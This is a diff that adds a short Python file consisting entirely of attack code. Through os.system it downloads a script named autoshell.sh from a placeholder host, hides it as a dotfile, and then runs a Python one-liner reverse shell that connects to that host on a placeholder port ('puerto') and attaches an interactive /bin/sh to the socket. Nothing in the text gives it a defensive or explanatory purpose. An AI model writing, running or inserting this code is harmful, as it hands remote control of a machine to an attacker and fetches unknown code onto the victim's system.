@@ -1,0 +1,5 @@
+import os
+
+os.system('wget http://ip/autoshell.sh')
+os.system('mv autoshell.sh .autoshell.sh')
+os.system('python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ip\",puerto));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);\'')
